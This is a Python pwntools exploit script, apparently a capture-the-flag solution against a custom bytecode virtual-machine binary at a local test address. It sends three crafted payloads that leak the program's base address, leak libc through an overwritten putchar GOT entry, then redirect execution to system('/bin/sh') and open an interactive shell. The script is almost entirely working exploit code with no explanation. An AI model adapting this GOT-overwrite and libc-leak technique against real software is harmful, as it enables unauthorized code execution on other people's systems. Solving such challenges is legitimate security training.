```python
from pwn import *
ip='172.17.0.3'     # test ip
port=9999           # test port
conn=connect(ip,port)

libc=ELF("/home/kali/ctf/task/VM/virtual_machine/src/libc.so.6")    #load libc

system_libc=libc.sym['system']
putchar_libc=libc.sym['putchar']
abinsh_libc=libc.search(b'/bin/sh').__next__()

puts_plt_r=0x00000000000010D0
putchar_got_r=0x0000000000005018
nop_addr_r=0x0000000000001D1D
nop_f_addr_r=0x0000000000007490
sysmm_addr_r=0x0000000000005100
ra_addr_r=0x0000000000005080
puts_f_addr_r=0x7560    # where we want puts' address to br stored


# leak .test base address
payload1=b""
payload1+=b"\x60\x00\x08\x00"
payload1+=b"\x60\x01"+(nop_f_addr_r-sysmm_addr_r).to_bytes(2,'little')
payload1+=b"\x28\x01"
payload1+=b"\x29\x01"
payload1+=b"\x11"
payload1+=b"\x48\x00\x02"
payload1+=b"\x81\x08"

conn.recvline()
conn.recvline()
conn.recvline()
conn.sendline(payload1)

nop_addr=int.from_bytes(conn.recvline()[0:8],'little')
text_base=nop_addr-nop_addr_r


putchar_got=putchar_got_r+text_base
puts_plt=puts_plt_r+text_base


# leak libc base
payload2=b""
payload2+=b"\x60\x01"+((puts_plt&0xffff)).to_bytes(2,'little')
payload2+=b"\x60\x00"+(puts_f_addr_r-sysmm_addr_r).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x10\x10"
payload2+=b"\x60\x01"+((puts_plt>>16)&0xffff).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x10\x10"
payload2+=b"\x60\x01"+((puts_plt>>32)&0xffff).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x60\x01"+(putchar_got&0xffff).to_bytes(2,'little')
payload2+=b"\x60\x00\x00\x00"
payload2+=b"\x45\x00\x01"
payload2+=b"\x10\x10"
payload2+=b"\x60\x01"+((putchar_got>>16)&0xffff).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x10\x10"
payload2+=b"\x60\x01"+((putchar_got>>32)&0xffff).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x2c"+((sysmm_addr_r-ra_addr_r)//8).to_bytes(1,'little')

conn.sendline(payload2)
putchar_addr=int.from_bytes(conn.recvline()[:-1],'little')

libcbase=putchar_addr-putchar_libc
system_addr=libcbase+system_libc
abinsh_addr=libcbase+abinsh_libc

# system("/bin/sh")
payload3=b""
payload3+=b"\x60\x01"+((system_addr&0xffff)).to_bytes(2,'little')
payload3+=b"\x60\x00"+(puts_f_addr_r-sysmm_addr_r).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x10\x10"
payload3+=b"\x60\x01"+((system_addr>>16)&0xffff).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x10\x10"
payload3+=b"\x60\x01"+((system_addr>>32)&0xffff).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x60\x01"+(abinsh_addr&0xffff).to_bytes(2,'little')
payload3+=b"\x60\x00\x00\x00"
payload3+=b"\x45\x00\x01"
payload3+=b"\x10\x10"
payload3+=b"\x60\x01"+((abinsh_addr>>16)&0xffff).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x10\x10"
payload3+=b"\x60\x01"+((abinsh_addr>>32)&0xffff).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x2c"+((sysmm_addr_r-ra_addr_r)//8).to_bytes(1,'little')

conn.recvuntil("---your code---\n")
conn.sendline(payload3)
conn.interactive()

```
